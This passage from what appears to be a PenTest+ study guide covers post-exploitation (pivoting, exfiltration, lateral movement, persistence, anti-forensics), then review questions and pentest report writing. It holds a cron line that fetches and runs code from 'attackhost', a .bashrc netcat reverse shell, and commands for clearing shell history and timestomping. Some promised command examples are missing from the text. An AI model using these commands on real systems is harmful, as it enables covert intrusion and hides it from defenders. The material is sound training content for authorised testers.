Dynamic port forwarding (-D ssh command flag) is when you connect to a target (SSH server) from your attack host (SSH client) and turn your host into a SOCKS proxy server:

ssh -D 9050 www.external.host.org

This will allow you to configure your web browser to connect through the SOCKS (i.e., SOCKS4 or SOCKS5) proxy connection when browsing web pages and allow you to execute port scans against internal hosts from outside the network using the SOCKS proxy. Proxychains is a command-line utility that comes preinstalled with Kali Linux that allows you to force an application (e.g., nmap) to send its requests through a SOCKS connection, as shown in Figure 9-22.

Figure 9-22 Nmap port scan through Proxychains

TIP In case you were trying to be stealthy with your attack methods, one of the differences between SOCKS5 and SOCKS4 proxies is that SOCKS5 can support TCP and UDP applications and provides DNS resolution through the SOCKS tunnel, whereas SOCKS4 will still use the localhost's DNS configuration.

Shell Types

SSH is likely not the only protocol you will use to establish a shell to a target. You may use TCP, HTTP, or some other protocol as well. You might use an SSH client, or you might use a shell from within Metasploit or some other attack tool. In Metasploit, for example, you may have to choose the type of shell for your payload. A bind shell will make the target listen for you to connect to it. A reverse shell will ask the target to connect back to you. If there is a firewall between you and the client, this can be useful when the firewall allows a protocol from the target to you, but not vice versa.

Command and Control

The idea of remotely manipulating a compromised system during an attack can be referred to as command and control (C2). You are controlling the target and issuing commands to it through an established communication channel. You may choose a protocol that is commonly used within an environment (such as HTTPS) in order to get through firewalls and avoid detection. You may wish to employ ways to conceal this traffic, such as encrypting it and disguising its frequency, sizing, or other identifying characteristics in order to blend in with normal traffic. These established channels are often used to perform post-exploitation activities, including data exfiltration.

Data Exfiltration

Data loss prevention controls will often look for sensitive data in order to prevent it from being removed from the environment. Pentesters may need to evade these controls by packaging the data before attempting to move it (such as by using an encrypted zip archive) or by chunking the data into smaller pieces before transferring it. Using alternative protocols is another tricky way to get data out of an environment. Here's an example of a command you could use in Linux to send the /etc/passwd file to another host using the ping command:

This command prints out the contents of the /etc/passwd file and pipes it to the xxd command, which creates a hex dump out of the file. The -c argument says to output the values in two columns, effectively making this 2 bytes per line. Then it pipes that output to xargs, which reads the output (delimited by spaces) and executes the ping command to the host 10.10.150.6 for each 2-byte argument it receives. The ping command it uses is sending a single echo request packet with a time to live of 10 using the pattern from xargs. When it's done, it pings the target again, but this time it sends a packet size of 55 (one less than the default). This basically signals the end of a file to the listening service. Once these requests are received by 10.10.150.6, a script can then assemble and decode the received bytes, and data has been successfully exfiltrated.

Lateral Movement

After obtaining a remote shell on a target host, you can leverage lateral movement techniques to access and control remote systems over the network, sometimes without the need to install additional tools or services in the target environment. Typically, this involves abusing weaknesses in remote services or using services that are designed for remote administration, remote access, or data sharing as they might normally be used. It is possible to do things like internal phishing to gain access to other assets, of course. But we'll focus on some techniques pentesters may use to remain undetected by living off the land, as well as methods involving lateral file transfer and pass-the-hash techniques.

Living Off the Land

Living off the land (LOL) is the concept of using tools that already exist on a system in order to exploit them without being detected. Simple examples include the use of SSH for Linux or Remote Desktop Protocol for Windows. There are two reasons this approach has merit. The first reason is that this makes it easier to blend in with normal system activities. By itself, this should make sense. The second reason, and this is the true spirit of LOL, is never having to write your tools to disk. You see, when you run many attack tools (such as Metasploit), they leave behind files that may need to be cleaned up after testing is finished. More importantly, each time you have to transfer a tool or write something to disk, it gives security software the opportunity to detect it. Therefore, you may also hear the technique of not writing to disk referred to as "fileless malware."

PowerShell

PowerShell is probably the most well-known example of native Windows tooling that is useful to pentesters. We've already talked about PowerShell-based exploit tools. However, these often rely on modules that don't exist natively in Windows. You still have to download tooling in order to use them. What if you wanted, instead, to use PowerShell to run it remotely without ever touching the disk?

From our Windows-based attack machine, we could set up a web server to host a copy of Empire's Invoke-Mimikatz script. Then we could open a remote PowerShell session on our target (10.10.150.6) from the attack host:

Enter-PSSession -ComputerName 10.10.150.6 -Credential $credentials

Then we could use the following PowerShell command to load the Mimikatz script remotely and run it in memory:

WMIC

Similarly, we could use WMIC to do it. To make this easier, first let's encode the command that we want to run (the Invoke-Command string) using base64. Then, we can run wmic from Windows to target our remote host with PowerShell.

Netsh

We talked about SSH tunneling, but what if SSH isn't installed? Netcat isn't installed either. Netsh is a built-in utility for Windows that allows you to modify the network connection of a system. If IPv6 is installed, we could redirect external traffic on port 443 to RDP, so that we could RDP through a proxy:

Passing the Hash

Pass-the-hash (PtH)–style attacks can be accomplished by using the NTLM hash value associated with a Windows local/domain account to authenticate to another remote host over the network. The MITRE ATT&CK matrix identifies this technique as a method that bypasses standard authentication steps that require a cleartext password (ID: T1075). This can help save time and energy during a pentest engagement, as you don't need to crack the hash—you can just bypass it. The PsExec SysInternals command can help facilitate this type of connection when using privileged user accounts. All the same theories and restrictions apply with PsExec, except you would be using a hash value instead of a password. Figure 9-23 shows an example of PtH using the psexec Metasploit module.

Figure 9-23 Pass the hash

NOTE Mimikatz (in debug mode) is another tool that you can use with the PtH technique when executing the following command: sekurlsa::pth /user:\<account\> /domain:\<domain\> /ntlm:\<ntlm hash\>. Microsoft has delivered multiple updates to mitigate the capability to PtH. Windows 7 and later versions with KB2871997 require valid domain user credentials of RID 500 administrator hashes. You can read more in the article "Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy" from the SpecterOps website: https://posts.specterops.io/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy-506c25a7c167

RPC/DCOM

The MITRE ATT&CK matrix identifies the Microsoft Windows distributed component object model (DCOM) as a valid lateral movement technique that can be used to extend the functionality of the component object model (COM) from the local computer to other computers, using remote procedure call (RPC) technology (ID: T1175). The Windows API utilizes the COM component to interact between software objects. The DCOM operates as a transparent middleware function to enable privileged user accounts (i.e., Administrators) access to the properties and methods of COM objects, such as Windows Office applications. Essentially, an application that was started through DCOM may be able to be accessed remotely over the network, typically through higher TCP port ranges. The Windows registry enforces access control lists to restrict permissions to interact with local and remote server COM objects. Similar to taking over an SSH agent from a remote user, a privileged user in Windows can interact with methods and properties from an application object started by the user, such as Microsoft Excel, that communicates with remote objects through macros. Enabling the Windows firewall will prevent DCOM instantiation by default (i.e., blocks access to those higher ports), while monitoring and detecting COM objects that try and load DLLs and other modules not typically associated with the application are ways to mitigate and detect against attackers taking advantage of lateral movement through Microsoft Office DCOM.

NOTE For further reading, Matt Nelso wrote a blog post about how you can use the Microsoft Management Console snap-in with COM for remote execution: https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/

Remote Desktop Protocol

A very popular method for connecting to remote Windows hosts is the remote desktop protocol (RDP). This service listens on port 3389/tcp and provides remote users with a graphical user interface (GUI) as if they were logged in to the console. Users on a Windows domain will need to be in the Remote Desktop Users group in order to be able to use this service. Otherwise, it is limited to users with administrative privileges. RDP provides SSL/TLS encryption to protect the confidentiality between the client/server connection. However, the service is prone to man-in-the-middle (MiTM) weaknesses, as the RDP server stores a hard-coded RSA private key in the mstlsapi.dll library. Local users with access to the file can retrieve the key and use it for the attack (Nessus Plugin ID: 18405). RDP can be configured to mitigate this vulnerability by forcing network-level authentication (NLA). This setting forces the client to present user credentials for authentication before the server will create a session for that user. NLA relies on the Credential Security Support Provider (CredSSP) Protocol; thus, if the RDP client does not support NLA or provide the necessary credential, it will not be permitted to log in to the remote host.

TIP Similar to RDP, the Apple Remote Desktop is an effective way of managing Mac computers on the network. The Apple Remote Desktop application listens on 3283/tcp. You can read more about the service at https://www.apple.com/remotedesktop.

WinRM

The Windows Remote Management (WinRM) protocol is a feature of PowerShell that provides native Windows remote command execution. You can enable PowerShell remoting via a PowerShell console running with administrator privileges and setting all remote hosts to trusted. Once WinRM has been updated for remote management, a listener will be started on HTTP port 5985/tcp. When you port-scan the service, nmap will fingerprint the service and print the banner information.

TIP In a production environment, you probably don't want to allow all remote hosts as trusted. You will want to lock this down to only trusted hosts on your network.

With PowerShell v2 or later, you can use the Invoke-Command cmdlet to execute commands against remote systems, or use Enter-PsSession to obtain an interactive PowerShell console with another remote host running WinRM. During a pentest engagement, you can take advantage of established trust relationships between hosts on the network while using native Windows operating system features and methods that are less likely to cause alarm within organizational security event monitoring systems.

Maintaining Persistence

We've talked about establishing backdoors with shells, but those are not always persistent. As soon as the shell crashes or the user logs out, the connection goes away. If the user whose password you have compromised changes it during the test, you will also lose access. Of course, if you make your own user, this last case may not be as much of an issue. But let's agree that it would be bad to lose access before the pentest is complete, only to find yourself in the position where you cannot re-create the exploitation path to get back to where you were. Therefore, you may want to take some steps to set up persistent access. The way you do this will vary based on the target operating system, so we'll address those separately.

NOTE To avoid detection when placing a persistent backdoor, it may be useful to create a trojan. A trojan is a malicious payload (for example, a remote shell) that masquerades as something more legitimate. One trick is to use an existing legitimate application and inject malware into it, then use the same filename and application in its original persistence location.

Windows

Two of the most well-known methods for persistence in Windows are scheduled tasks and startup locations. Scheduled tasks are configured in Windows Task Scheduler. The command line for this is schtasks. If we wanted to set up a scheduled task to run our fileless PowerShell, we could do something like the following to have it run each time a new user logs into the system:

A more subtle method of implementing this could use the Squiblydoo attack, which uses more innocuous-looking Windows native binaries to pull the web-hosted malware, this time in Windows Script Component (.sct) format:

As mentioned, though, scheduled tasks are not the only persistence mechanism within Windows. Windows looks many places to determine what to launch whenever it starts. In some cases, it uses the startup folders or registry keys. In other cases, applications that are automatically launched by Windows may look for specific content whenever they launch. Here are a few Windows startup locations where shells can be injected for persistence:

Autostart folders

• %appdata%\Microsoft\Windows\Start Menu\Programs\Startup

• C:\Users\USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

• %programdata%\Microsoft\Windows\Start Menu\Programs\Startup

• C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp

Registry

• HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

• HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Run

• HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce

• HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnceEx

• HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices

• HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce

• HKLM\System\CurrentControlSet\Services

• HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices

• HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce

• HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components

• HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components

• HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\SharedTaskScheduler

• HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\SharedTaskScheduler

Linux

In Linux, scheduled tasks are handled by crontab. Additionally, programs may be launched on startup as part of a user's profile settings or in the system-configured daemons. Each of these has a slightly different approach. Where possible, we'll focus on doing this filelessly, but you can always upload your payload and reference it instead.

Crontab

Let's start with setting up a reverse shell using crontab. Tasks scheduled in crontab can be user specific or run across the entire system. Permission to edit the crontab is often limited. To target a specific user's crontab, you would give their username after the crontab command. By default, it will attempt to manipulate the system crontab.

To list the existing entries, use the command crontab -l. One way to edit the entries is by using crontab -e. The first thing you'll want to know, before scheduling, is how the scheduling syntax works. Cron takes a minute, hour, day of the month, month, and day of the week as a scheduling argument, in that order. It uses an asterisk to indicate "any." So, the following syntax tells cron to execute the command every five minutes, every day. The command we will set up tells curl to insecurely (-k) fetch a web page and send the output to a shell to be executed. This is somewhat similar to how we use scheduled tasks in Windows to run things filelessly.

/5 \* \* \* \* curl -k http://attackhost/evil-file.txt |sh

User Profile

Users can configure settings to modify their environment and shell when they log in. These profile settings can also be hijacked for persistence. In this example, a user using the Bash shell has a .bashrc file. Editing that file to add the following line would create a reverse shell on port 8675 for access each time the user logs in and loads their shell environment.

nc -e /bin/bash attackhost 8675 2\>/dev/null &

Daemons

If you have root access to a machine, you can create a service to run each time the system starts in order to establish persistence. How you do this will depend somewhat on whether the system is using systemv, systemd, or something else (like upstart) for init. For this example, we'll focus on systemd.

Under /etc/systemd/system you can create your pentestpersist.service service descriptor file. The contents may look something like the following:

Then, you would configure it to run each time the system starts by running systemctl enable pentestpersist from the command prompt.

Covering Your Tracks

The MITRE ATT&CK matrix defines covering your tracks as defensive evasion, which consists of methods and techniques that an attacker may use to help avoid detection through network monitoring. The following are defense evasion techniques from the MITRE ATT&CK matrix that are relevant for penetration testing:

• Clear Command History (ID: T1146)

• Timestomping (ID: T1099)

• File Deletion (ID: T1107)

Clearing Command History

Both Linux and Mac operating systems keep track of the commands users type in the terminal. The BASH shell will record keystrokes in the $HOME/.bash\_history file. During a pentest, once you obtain access to a UNIX/Linux/Mac operating system, it is best practice to unset the history file to prevent the user/administrator from knowing what commands you were executing, as well as not commingling your dirty/malicious commands with a user's history. Unsetting the history file is as easy as shown here:

• unset HISTFILE Temporary history will not be written to disk

• export HISTFILE=0 Temporary history will not be written to disk

• history -c Clears temporary history file

• set +o history Prevents commands from recording to temporary history

Administrators can counter the defense evasion attack by setting the variable read-only to help preserve the contents of the history file for forensic purposes.

Timestomping

A technique used to modify the timestamps of a file (the modify, access, create, and change times) is called timestomping. This technique can be executed by an attacker against files and directories that were modified. The timestomp feature in a Meterpreter shell can be a good way to limit the digital footprint of reading and writing data on the file system. To see a list of options, you can use the following syntax:

meterpreter\> timestomp ?

Options:

• -v Display the UTC MACE values of the file

• -m Set the "last written" time of the file

• -a Set the "last accessed" time of the file

• -c Set the "creation" time of the file

You can see what the date timestamps look like before and after, then change it back to the before look. Imagine you wanted to change the contents of a user's logon script or even a scheduled task that points to a PowerShell file in the administrator's home directory called "script.ps1" and add some arbitrary code to the file to assist with persistence. Once you modify the file, you can use timestomp to change the file back to the original values. This way your modification doesn't set off any red flags when looking at the date timestamp.

Let's say you are on a Windows database server after successfully exploiting an MS SQL injection vulnerability through the customer's web server. You want to remove your nefarious actions from the www and db log files and timestomp them to a period of time prior to the attack.

After you remove your malicious entries in the log, you can use PowerShell to change the file properties LastWriteTime, LastAccessTime, and CreationTime for each log file. To do this, you could use the Get-Item cmdlet to identify the item (file) you want to modify, define the date you want to set the files to (the format is MM/DD/YYYY HH:MM am/pm), and apply the new timestamp to each file property. This can help conceal your entry and allow you to continue with your testing objectives and not draw as much attention to yourself.

CAUTION If you modify the contents of a file that a customer is monitoring with integrity checking software (like Tripwire), the change will still be identified and will likely trigger an alert. Integrity monitoring software compares a cryptographic hash of the file from the time the file was last inspected. These tools can be set to run at various times through scheduled tasks. There is a difference between changing the last written/accessed/creation time and creating a cryptographic hash of the target file.

In Linux, you can also change the timestamp on a file by issuing the command touch -t YYYYMMDDhhmm (using your desired time and date) on your filename.

File Deletion

Malware, tools, or other non-native files dropped or created on a system may add to the attacker's digital footprint. Metasploit is a great way of avoiding this hurdle when exploiting and executing code from within the framework, as there are automated mechanisms for cleaning up tools and residing in memory. The attacker may also clean the contents from /var/log/\* on Linux/UNIX/Mac operating systems or wipe out the Event Viewer database on Microsoft systems. To mitigate, organizations can leverage logging servers (i.e., SYSLOG) to send security-relevant messages and information to a central host. This will help make the attacker's job harder when covering their tracks if the log events are stored on another system or part of the network that they don't have access to.

Chapter Review

In this chapter we covered a lot of ground with regard to post-exploitation techniques, including enumeration, persistence, exfiltration, detection evasion, lateral movement techniques, and methods for privilege escalation. We first talked about gaining situational awareness to identify attack opportunities, prioritize attack strategies, and work more efficiently during the assessment. Then we addressed how you might use that information to further your access within a network or host and how to get that data out of the environment stealthily. We talked about techniques pentesters can use to move from system to system and network to network within an environment, including how to live off the land and use fileless malware in executions and in persistence. Lastly, we talked about how to further cover your tracks during a pentest.

Questions

1. One important step during post-exploitation is to gain situational awareness to gather important knowledge of the host and internal network. Which of the following techniques from the MITRE ATT&CK framework are identified as "discovery" tactics? (Select all that apply.)

A. Enumerate files and directories on the local or shared file system.

B. Search for local or domain-level groups and permission settings.

C. Timestomp files and directories after exploitation.

D. Use a protocol native to the operating system like SSH or FTP to transfer files.

2. During a pentest, you successfully compromised user-level access to a Linux host within your customer's network. The user's default shell is Bash. Which command syntax could you use to suspend command recording for your terminal session? (Select all that apply.)

A. unset HIST

B. unset HISTFILE

C. set +o history

D. export HIST=0

3. You find that the user account "user1" you just compromised might be permitted to execute privileged commands on the system using sudo. After you suspend command recording in your terminal window, you execute the sudo -l command and are not prompted for a password. To your surprise, the account can execute all commands on the operating system and you still are not prompted for a password. Which setting in the /etc/sudoers file would allow the user to execute commands without a password?

A. %sudo ALL=(ALL:ALL) ALL

B. %sudo ALL=(ALL:ALL) NOPASSWD:ALL

C. user1 ALL=(ALL:ALL) ALL

D. user ALL=(ALL:ALL) NOPASSWD:ALL

4. Group Policy Preferences (GPP) was introduced in Windows 2008 Server and allows domain administrators to create domain policies to automate tedious tasks, such as changing the local Administrator account password on the host operating system. Each policy is created with an encrypted password (cPassword) embedded within the policy, and each policy is stored in SYSVOL, which is accessible to any user that is a member of the domain. During a pentest, you successfully mount the SYSVOL volume using user-level privileges on the domain. The domain server is a Windows 2012 server. Which file will contain the cPassword entry?

A. Group.xml

B. Users.xml

C. Groups.xml

D. Policy.xml

5. A \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_ is unique and is used to identify each instance of a Windows service. In Windows, Kerberos requires that \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_ be associated with at least one service logon account (i.e., the account that runs the service).

A. Hostname

B. Domain name

C. Unique identifier

D. Service principal name

6. During a pentest, you use the wmic command to identify unquoted service paths. You were able to find a path at C:\Program Files (x86)\data\shared files\vulnerable.exe and used accesschk.exe to find that you have write privileges in the "data" directory. To escalate privileges the next time the service is executed, you need to lay down an executable that will execute within the service path. What is the correct name for the executable that you should create?

A. shared.exe

B. files.exe

C. shared\_files.exe

D. Program.exe

7. During a pentest, you come across an SSH private key (id\_rsa) in a user's home directory and suspect that this key can be used to remotely log in to other Linux hosts. However, before you try to use the key, you want to compare the key to the contents of the authorize\_keys file to ensure it matches one of the public keys stored in the file. Which command would you run to generate a public key from the private key?

A. ssh-keygen -y -f id\_rsa

B. ssh-keygen -t rsa -b 2048

C. diff id\_rsa.pub id\_rsa

D. openssl rsa -in id\_rsa | cat id\_rsa.pub

Answers

1. A, B. Enumerating files and directories on local or shared file systems (File and Directory Discovery: T1083) and searching for local or domain-level groups and permission settings (Permission Groups Discovery: T1069) are two techniques related to gaining situational awareness.

2. B, C. The unset HISTFILE technique will allow temporary history but will prevent the command history from being written to $HOME/.bash\_history. The set +o history will prevent temporary command history and subsequently prevent any command history from being written to disk.

3. B. The account "user1" is likely in the sudoers group called "sudo." The NOPASSWD:ALL option will allow any command on the operating system to be executed without the need to prompt for a password. Using the groups or id -a command syntax, you would be able to see which groups the user was a part of. In the /etc/sudoers file, groups or users can be configured with specific sudo privileges on the local operating system.

4. C. The groups.xml file will contain the encrypted cPassword entry. The AES 256-bit key was disclosed online from Microsoft, which allows the cPassword entry to be decrypted, thus disclosing the sensitive password.

5. D. The service principal name (SPN) is unique and is used to identify each instance of a Windows service. In Windows, Kerberos requires that the SPN be associated with at least one service logon account.

6. A. When the service starts, it will follow the execution path to C:\Program Files (x86)\data\shared files\vulnerable.exe to run the executable. Since the path is not in quotations in the registry, it will first look to load C:\Program Files (x86)\data\shared.exe because there is a space between the directory "shared files."

7. A. The ssh-keygen command is used to generate keys. To compare the private and public key values, you would generate a public key from the private key using the following syntax: ssh-keygen -y -f \<private key\>. Then, you could read the contents of the authorized\_keys file and compare and contrast the differences, if any.

CHAPTER 10

Post-Engagement Activities

In this chapter, you will learn about

• Important components of written pentest reports

• Analyzing findings in order to make appropriate recommendations

• Exploring post-delivery activities

The pentest report is an important artifact for the customer. The data contained therein can allow senior management to make informed risk decisions on how to prioritize and mitigate security deficiencies in their network. The pentest report provides tangible evidence that portrays the security posture of organizational assets and the effectiveness of installed security countermeasures to protect against an applicable attack vector.

Ultimately, the pentester is responsible for everything that goes into the final report. For some, writing the report may not be as fun as testing and exploitation, but the report is equally as important and can help your customer improve their defenses. Vulnerabilities that are not addressed in the report can get overlooked, leaving the customer susceptible to attack. In this chapter, we will discuss best practices for writing and handling a pentest report and test data, analyzing findings and making recommendations, and performing post-report delivery activities.

The Anatomy of a Pentest Report

Congratulations! You've finished the grueling process of planning a pentest: driving consensus among all stakeholders, doing all of that research and preparation work, and getting all the contracts signed. You've spent hours staring at a screen in a mixture of frustration, confusion, disbelief, and maybe even accomplishment. Hopefully, you kept good notes along the way and maybe got to enjoy a root dance or two. Now comes the part few pentesters look forward to: the report. The report, however, is arguably one of the most important parts of an engagement. Its contents justify the pentest. A report communicates the results in writing, contains all of the expert analysis, and describes and provides evidence of the activities undertaken to fulfill the terms of the agreement. So, gather all of your notes and the appropriate testing artifacts to support your story. It's time to analyze the evidence and create a report.

The report format and contents, audience, and security are your next goals for consideration. The report should organize the relevant details according to the type of test and the goals of the engagement. Regulatory requirements, for example, may dictate that the report observes a specific format or contains certain information. Additionally, you need to frame the information you plan to present for consumption by different audiences. Understanding the expectations of each audience avoids miscommunication and improves efficiency of the deliverable. Finally, you'll need to make sure that you are being security conscious in your own handling of the report and supporting evidence during the delivery process. We'll discuss each of these concepts in this section.

Reporting Audience

One of the most important considerations a pentester should keep in mind when preparing for delivery is to know your audience. Data consumers need different information in order to fulfill their responsibilities in the process and may have different understandings of security. Let's talk about a few examples of report consumers and the kinds of information each may need from pentest deliverables.

The C-Suite

Executives need enough information to make business decisions about security strategy and expenditure. It's fair to assume that most are not going to want the same level of technical detail as stakeholders with direct responsibility for implementation. Instead, it may be more appropriate to provide summary data, which describes the overall impact to the business, strategic analysis of patterns in findings, and metrics that help determine the current state of security. Use a bottom-line up-front (BLUF) approach with concise language that describes high-level details in clear layperson's terms. Most reports should include an executive summary that is tailored to this audience. We'll discuss that further in the next section.

Technical Staff

Technical audiences may include systems administrators, security control owners, and incident response staff, to name a few. These individuals typically require a more comprehensive and in-depth look at the pentest details. In order to take action to prevent or detect attacks, they need enough detail about how the attack works in order to duplicate it to verify when it is successfully mitigated or to understand what mitigations are appropriate for their specific environment. These audiences often use and understand technical language and concepts as part of their expected job responsibilities. Be prepared to have in-depth discussions exploring the internal details of how a tool; exploit; system; or tactic, technique, or procedure (TTP) works when they have questions. Within the report, the attack narrative, findings and analysis, and even appendix data will likely be key areas of interest for this group.

Developers

Developers are also technical staff, but earn a special distinction in our examination of pentest audiences due to the specialized nature of their concern. Developers are responsible for the creation and maintenance of code, but not necessarily with the implementation of systems or networks. While a system administrator might not have the background to understand the internals of a weakness in source code, developers might be less interested in operating system patching or the impact of network segmentation weaknesses. Developers are most frequently engaged in application testing or in findings that surface weaknesses in the overall software development lifecycle process. Therefore, the kind of information that needs to be shared with developers, and the kinds of clarification they may request, often differ from the requirements of other technical audiences.

Third-Party Stakeholders

Third-party stakeholders frequently are those who do business with the customer being tested. Other businesses who rely on the customer for data processing and cyber insurance processors are two examples of possible third-party stakeholders. Unlike with technical staff and business leaders who are responsible for responding to testing results with measures that change the tested organization's security response, this audience may not need access to the full pentest report. Instead, they are interested in the outcome of testing as part of an audit process, which asserts that the target organization's security is being tested. This audience may only need to see an attestation letter rather than any part of the report.

Report Contents

Reports can be written in word processing software, such as Microsoft Word, or with custom tools and web interfaces. However, reports will typically follow common best practices. For instance, you will likely want to include the name and contact information of the tester in case there are questions upon delivery. And you may want to include a table of contents (TOC) at the beginning of the report. If you have figures (screenshots) with captions (e.g., Screenshot 1: Success – Privileged level access to application), you can insert a table of figures as well in the TOC. These tables help organize the report and allow the reader to skip to sections they are most interested in. In this section, we will incorporate some of the report writing guidance offered from multiple sources to introduce you to these concepts for the CompTIA PenTest+ exam.

Reporting requirements can vary based on the type of assessment that was conducted. Regulations, industry standards, and organizational requirements can all influence report contents. But most will contain common pentest report components such as an executive summary, a section regarding findings and recommendations, and a section that details scoping and methodology. Before we go into the different report sections, let's take a moment to talk about what reports will commonly cover.

Since pentest planning documents are not always included with the report, and since report consumers are not always the same as the stakeholders involved in test planning, the report often summarizes some of that information to provide context for those who are reading the report. Reports should include background information, such as the testing schedule, scope, tools, techniques, and methodologies that were utilized, as well as any limitations placed upon testing so that the results can be understood. Similarly, some best practices apply to presentation of evidence and reporting language.

Choose your screenshots and evidence thoughtfully. Don't include more information than you need to show to prove your result, but be sure you are including enough detail that report consumers can understand what they're seeing. Make sure the evidence is readable, and annotate your graphics, if necessary. For example, if you took a screenshot of your terminal window to illustrate how you escalated privileges on the customer LDAP server, you really don't need to have the scroll bar and menu bar included in the screenshot. You might even be able to include only a part of the screen's contents. You may want to redact or call out specific elements of interest for your audience. Consider if your evidence includes sensitive information (such as password hashes), can you redact or obfuscate portions of the data to protect it, while still showing that you were able to access it? You might highlight field names that show it contains a password or an administrator account, while blocking out the actual passwords. Regardless of your approach, you will need to be clear with your tone and your explanations.

The tone of a pentest deliverable should always be professional and objective. Avoid the use of accusatory language. For example, "Your sysadmins are bad, because they like to use easily guessable passwords" is not a good professional statement. Your job is not to point fingers or gloat about how you obtained the privileges of a domain administrator; your job is to provide the relevant detail to help your customer improve their security. Educate your consumer! Remain formal and impersonal at all times, and communicate penetration testing deliverables such that each technical concept is phrased clearly and with the relevant detail to support the conclusions. Now, let's talk about the sections of a pentest report.

NOTE Offensive-Security publishes a sample pentest report you can look at to get an idea of what a report might look like if you have not seen one. Keep in mind that reports vary, both in content and presentation: https://www.offensive-security.com/reports/sample-penetration-testing-report.pdf

Executive Summary

The executive summary is your BLUF summary of the report. Typically, this is one to two pages of information that quickly summarizes key details from the report, including brief context about the time frame of testing, the steps taken, the objective of testing, an ultimate summary of the results, and highlights from recommendations and analysis. The executive summary should not cover information that is not discussed in more detail later in the report. Rather, it should contain the minimum necessary high-level detail to convey key points and be able to stand alone from the remainder of the report. Focus on overall goal attainment, systemic issues, and the impact to the business. Avoid including "the kitchen sink." The executive summary should address suggested remediation roadmaps, visual representations of key metrics, and strategic analysis of the results. This section should avoid jargon as much as possible and present details in clear, concise language that can easily be understood by a nontechnical audience.

EXAM TIP The Penetration Testing Execution Standard (PTES) contains an example executive summary: https://pentest-standard.readthedocs.io/en/latest/reporting.html#the-executive-summary

Scope Details

The scope can be found in the statement of work (SOW), but should also be defined in the pentest report. The report should cover the scope of the network and systems to be tested during the engagement, such as IP addresses, hostnames, application names and application programming interfaces (APIs), etc. Testing boundaries and network segments should be articulated in such a way that answers all of the questions as to what was actually tested during the engagement. Network architecture drawings can be an effective way of describing the boundaries for testing. If any critical systems were included or excluded from the assessment, that information should be provided as well.

The scope details should also include a statement of limitations, if appropriate. A pentest may have certain limitations or restrictions that control the hours when testing can be conducted, bandwidth restrictions, special testing requirements for legacy systems, duration of testing, or other things that could add overhead to the pentest engagement. Imposing time constraints, especially when operating in different time zones, could require the pentester(s) to change their daily routines to accommodate the customer's restrictions. Anything preventing the pentest team from interacting with legacy parts of the network is good information to include in the report. This level of detail provides a premise to help support the scenarios executed during the engagement and if the engagement simulated a "real-life" cyber-attack.

Methodology and Attack Narrative

This section covers the penetration testing methodology identified in the SOW. This clarifies what attack types were used and what kind of testing was done. Each method can have one or more activities that can be tested to simulate the approach that could be taken by a threat actor to cause harm to the organization. When drafting the pentest report, you should make sure that you address each of the objectives and methods agreed upon for testing and ensure the information you provide is adequate to helping your customer achieve their overall goals for the pentest, regardless of the report format you choose to use.

A testing narrative can provide additional context by telling the story of the pentest. Explaining the logical steps between attacks can help defenders determine the priority for which security changes to make in order to break attack chains. It can also help defenders better understand the nature of the weaknesses that enabled the attack. If you don't accomplish your goal, it can stand as proof of the effort that was made and share positive kudos about defenses. The PCI "Penetration Testing Guidance" document also suggests that the testing narrative document any issues encountered during testing, such as any type of interference that was encountered or observed as a result of active protection systems (e.g., firewalls, intrusion prevention systems, Network Access Controls [NACs], etc.).

Let's assume that during an internal pentest engagement your goal was to obtain domain administrator access on the client's network; however, you could only obtain local administrator access on 10 percent of the in-scope targets, given the time allotted for the pentest. Although you didn't achieve the objective, the techniques used to obtain local administrator access could be noteworthy to the customer, as corrective actions could be applied using your narrative in order to remediate up to the point where you successfully obtained local administrator access. Following are some further examples of methodology and narrative information for different kinds of reports.

Table 10-1 suggests examples for descriptions of information gathering for network testing.

Table 10-3 Mobile Platform and Application Testing

Social engineering testing may involve initial discovery using OSINT. A narrative might explain that the tester performed Internet searches to identify personnel of interest who are responsible for system management. As an example:

The pentest team used theHarvester tool to collect e-mail addresses from publicly available resources. The scan data from this activity is located in Appendix A: OSINT. The following notable e-mail addresses were obtained from the scan:

• user1@example.com

• user2@example.com

• dev1@example.com

• admin@example.com

Pentest Narrative: A Shortened Example

This is a shortened example attack narrative. Note that target details are not included in this example in the interest of brevity. A narrative may refer to additional data stored in appendixes or include specific details or attack diagrams as needed.

On November 30, the tester launched a spear phishing campaign targeting ten users. The phishing e-mail contained a link to a staged website (https://fakeurl/fakepage) which contained a JavaScript exploit (CVE-2014-6332) that launches a VBScript and PowerShell-based payload. Four users clicked on the malicious website, causing the payload to download and execute a stager. The stager wrote two executables to disk (pwn.exe and pwn2.exe). The executables conducted automated discovery on the systems and created a persistent scheduled task for our HTTPS-based C2 beacon. The exploit successfully completed on two of the four systems, granting access via a remote shell with SYSTEM-level privileges. The tester was then able to extract credentials, including plaintext passwords, from memory. On system 4286-D, the user workst-admin was logged in. The tester was able to confirm that this account had administrator access to 23 other systems in the environment based on domain groups and network systems discovery. The tester was able to use this credential to perform lateral movement via remote execution to the system SRV-269 using WMI to remotely create a scheduled task to download and run the staged C2 beacon using the following command…

Findings and Remediation

This section of the report will contain an ordered list of the findings from the test. These are the results of the testing efforts in technical detail. This is often the longest section of the report outside of appendixes. Techniques for organizing the findings vary based on the kind of pentest and who is conducting testing. It is generally a best practice to order findings by severity in addition to any other criteria used.

